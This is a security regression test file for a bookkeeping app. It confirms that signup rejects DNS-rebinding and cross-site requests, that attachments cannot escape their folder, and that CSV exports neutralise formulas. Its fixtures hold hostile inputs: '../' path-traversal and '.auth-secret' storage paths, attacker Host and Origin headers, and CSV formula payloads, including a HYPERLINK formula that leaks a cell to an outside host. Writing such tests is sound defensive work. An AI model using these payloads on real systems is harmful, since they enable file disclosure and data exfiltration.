/**
 * Security review round 2 regressions:
 *  1. An attachment row (e.g. restored from a crafted .bka) cannot read files outside
 *     <dataDir>/attachments (path traversal; fixed in attachments.ts / backup.ts).
 *  2. The first-account signup refuses a non-loopback Host header (DNS rebinding) and a
 *     cross-site Origin (CSRF), but still works from the app itself.
 *  3. Archived companies are not reachable through side paths: the employee portal, phone
 *     receipt links, the launch-time recurring run (which now covers every live company), and
 *     rename.
 *  4. CSV exports neutralize spreadsheet formulas (lib/csv.ts) but keep negative numbers.
 *  5. Expense report lines can't reference another company's account.
 */
import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import path from 'node:path';
import fs from 'node:fs';
import { eq } from 'drizzle-orm';
import { NextRequest } from 'next/server';

const h = vi.hoisted(() => ({
  cookies: new Map<string, string>(),
  headers: new Map<string, string>(),
}));
vi.mock('next/headers', () => ({
  cookies: async () => ({
    get: (n: string) => (h.cookies.has(n) ? { name: n, value: h.cookies.get(n)! } : undefined),
  }),
  headers: async () => new Headers([...h.headers.entries()]),
}));

const TEST_DIR = path.resolve(process.cwd(), '.bookkeeper-data', 'test-review2-security');
const OUTSIDE = path.resolve(process.cwd(), '.bookkeeper-data', 'test-review2-security-outside.txt');
process.env.BKA_DATA_DIR = TEST_DIR;
process.env.BKA_AUTH_SECRET = 'review2-security-secret';
process.env.BKA_INTERNAL_TOKEN = 'review2-internal-token';

import { getDb, closeDb, type DB } from '@/lib/db';
import { accounts, attachments, companies, employees, recurringTemplates, users } from '@/lib/db/schema';
import { createPortalToken, getPortalEmployeeId, hashPassword, PORTAL_COOKIE } from '@/lib/auth';
import { csvMinimal, csvQuoted, csvSafeText } from '@/lib/csv';
import { fullAccess } from '@/lib/permissions/model';
import { getAttachmentFile } from './attachments';
import { csvEscape } from './listExport';
import { createCompany } from './company';
import { createUploadToken, uploadLinkStatus } from './receipts';
import { createReport } from './expenseReports';
import { renameCompany } from '@/app/api/companies/[id]/manage';
import { POST as signupPOST } from '@/app/api/auth/signup/route';
import { POST as portalLoginPOST } from '@/app/api/portal/login/route';
import { POST as recurringRunPOST } from '@/app/api/recurring/run/route';

let db: DB;

function jsonRequest(url: string, body: unknown, extra: Record<string, string> = {}) {
  return new NextRequest(`http://127.0.0.1${url}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', ...extra },
    body: JSON.stringify(body),
  });
}

function resetRequest() {
  h.headers.clear();
  h.cookies.clear();
}

async function archive(companyId: string) {
  const [c] = await db.select().from(companies).where(eq(companies.id, companyId));
  await db
    .update(companies)
    .set({ settings: { ...((c.settings ?? {}) as Record<string, unknown>), archived: true } })
    .where(eq(companies.id, companyId));
}

const ownerCtx = (companyId: string, userId: string) => ({
  db,
  companyId,
  userId,
  access: fullAccess(),
  role: 'owner' as const,
});

describe('security review round 2', () => {
  beforeAll(async () => {
    fs.rmSync(TEST_DIR, { recursive: true, force: true });
    db = await getDb(TEST_DIR);
  });

  afterAll(async () => {
    await closeDb(TEST_DIR);
    fs.rmSync(TEST_DIR, { recursive: true, force: true });
    fs.rmSync(OUTSIDE, { force: true });
  });

  // These run first: the file has no user yet, so signup is open.
  describe('first-account signup', () => {
    const body = { name: 'Mallory', email: 'mallory@evil.example', password: 'attackerPass99', companyName: 'Pwned' };

    it('refuses a non-loopback Host header (DNS rebinding)', async () => {
      resetRequest();
      const res = await signupPOST(jsonRequest('/api/auth/signup', body, { host: 'rebind.attacker.example:3000' }));
      expect(res.status).toBe(403);
      expect(await db.select().from(users).where(eq(users.email, body.email))).toHaveLength(0);
    });

    it('refuses a cross-site Origin (CSRF to 127.0.0.1)', async () => {
      resetRequest();
      const res = await signupPOST(
        jsonRequest('/api/auth/signup', body, { host: '127.0.0.1:3000', origin: 'https://evil.example' }),
      );
      expect(res.status).toBe(403);
      expect(await db.select().from(users).where(eq(users.email, body.email))).toHaveLength(0);
    });

    it('still works from the app itself (same-origin)', async () => {
      resetRequest();
      const res = await signupPOST(
        jsonRequest(
          '/api/auth/signup',
          { name: 'Real Owner', email: 'real@owner.local', password: 'realOwnerPass1', companyName: 'Real Co' },
          { host: '127.0.0.1:3000', origin: 'http://127.0.0.1:3000' },
        ),
      );
      expect(res.status).toBe(201);
    });
  });

  it('CSV cells neutralize spreadsheet formulas but keep plain numbers', () => {
    for (const evil of ['=HYPERLINK("http://x/?"&A2)', '+1+cmd', '-2+3', '@SUM(A1)', '\t=1', '\r=1']) {
      expect(csvSafeText(evil).startsWith("'")).toBe(true);
      expect(/^[=+\-@\t\r]/.test(csvEscape(evil).replace(/^"/, ''))).toBe(false);
      expect(csvQuoted(evil).startsWith(`"'`)).toBe(true);
    }
    for (const n of ['-150.00', '+3', '-$1,234.50', '-12%', '-.5']) expect(csvSafeText(n)).toBe(n);
    expect(csvSafeText(-5)).toBe('-5');
    expect(csvMinimal('a,b')).toBe('"a,b"');
    expect(csvMinimal('plain')).toBe('plain');
    expect(csvQuoted('say "hi"')).toBe('"say ""hi"""');
  });

  describe('archived companies and company scoping', () => {
    let ownerId: string;
    let oldA: string;
    let liveB: string;

    beforeAll(async () => {
      resetRequest();
      const [u] = await db
        .insert(users)
        .values({ email: 'owner2@rev.local', name: 'Owner', passwordHash: await hashPassword('ownerpass1') })
        .returning();
      ownerId = u.id;
      oldA = (await createCompany(db, { name: 'Old Archived Co', ownerId })).id;
      liveB = (await createCompany(db, { name: 'Live Co', ownerId })).id;
      // A is unambiguously the oldest company in the file.
      await db.update(companies).set({ createdAt: new Date('2000-01-01T00:00:00Z') }).where(eq(companies.id, oldA));
    });

    it('an attachment row cannot read files outside attachments/ (path traversal)', async () => {
      fs.writeFileSync(OUTSIDE, 'TOP SECRET');
      const ctx = ownerCtx(liveB, ownerId);
      const [row] = await db
        .insert(attachments)
        .values({ companyId: liveB, filename: 'x.txt', storagePath: '../test-review2-security-outside.txt', mimeType: 'text/plain' })
        .returning();
      const [secret] = await db
        .insert(attachments)
        .values({ companyId: liveB, filename: 'y.txt', storagePath: '.auth-secret', mimeType: 'text/plain' })
        .returning();
      await expect(getAttachmentFile(ctx, row.id)).rejects.toThrow();
      await expect(getAttachmentFile(ctx, secret.id)).rejects.toThrow();
    });

    it('expense report lines refuse another company\'s account', async () => {
      const [emp] = await db
        .insert(employees)
        .values({ companyId: liveB, firstName: 'Ed', lastName: 'Expense' })
        .returning();
      const [foreign] = await db.select({ id: accounts.id }).from(accounts).where(eq(accounts.companyId, oldA)).limit(1);
      const [own] = await db.select({ id: accounts.id }).from(accounts).where(eq(accounts.companyId, liveB)).limit(1);
      expect(foreign && own).toBeTruthy();
      await expect(
        createReport(ownerCtx(liveB, ownerId), { employeeId: emp.id, lines: [{ accountId: foreign.id, amount: '10' }] }),
      ).rejects.toThrow(/does not exist in this company/);
      await expect(
        createReport(ownerCtx(liveB, ownerId), { employeeId: emp.id, lines: [{ accountId: own.id, amount: '10' }] }),
      ).resolves.toBeTruthy();
    });

    it('portal sign-in and portal sessions end for an employee of an archived company', async () => {
      const hash = await hashPassword('portalPass1');
      const [emp] = await db
        .insert(employees)
        .values({ companyId: oldA, firstName: 'Ann', lastName: 'Archived', email: 'ann@archived.local', portalPasswordHash: hash, isActive: true })
        .returning();
      // Before archiving: the portal works.
      resetRequest();
      h.cookies.set(PORTAL_COOKIE, createPortalToken(emp.id, hash));
      expect(await getPortalEmployeeId()).toBe(emp.id);

      await archive(oldA);
      expect(await getPortalEmployeeId()).toBeNull();
      resetRequest();
      const res = await portalLoginPOST(
        jsonRequest('/api/portal/login', { email: 'ann@archived.local', password: 'portalPass1' }),
      );
      expect(res.status).toBe(401);
    });

    it('a phone receipt link stops working once its company is archived', async () => {
      const linkCo = (await createCompany(db, { name: 'Link Co', ownerId })).id;
      const link = await createUploadToken(ownerCtx(linkCo, ownerId));
      await expect(uploadLinkStatus(db, link.token)).resolves.toBeTruthy();
      await archive(linkCo);
      await expect(uploadLinkStatus(db, link.token)).rejects.toThrow();
    });

    it('an archived company cannot be renamed', async () => {
      await expect(renameCompany(db, ownerId, oldA, 'Renamed')).rejects.toThrow();
      await expect(renameCompany(db, ownerId, liveB, 'Live Co 2')).resolves.toBeTruthy();
    });

    it('the internal recurring run skips archived companies and covers every live one', async () => {
      const due = new Date(Date.now() - 2 * 86_400_000);
      await db.insert(recurringTemplates).values([
        { companyId: oldA, name: 'Archived reminder', docType: 'journal_entry', template: {}, mode: 'remind', frequency: 'monthly', nextRunDate: due },
        { companyId: liveB, name: 'Live reminder', docType: 'journal_entry', template: {}, mode: 'remind', frequency: 'monthly', nextRunDate: due },
      ]);
      resetRequest();
      const res = await recurringRunPOST(
        jsonRequest('/api/recurring/run', {}, { 'x-bka-internal': 'review2-internal-token' }),
      );
      expect(res.status).toBe(200);
      const body = await res.json();
      const names = (body.reminders ?? []).map((r: { templateName: string }) => r.templateName);
      expect(names).not.toContain('Archived reminder');
      expect(names).toContain('Live reminder');
    });
  });
});
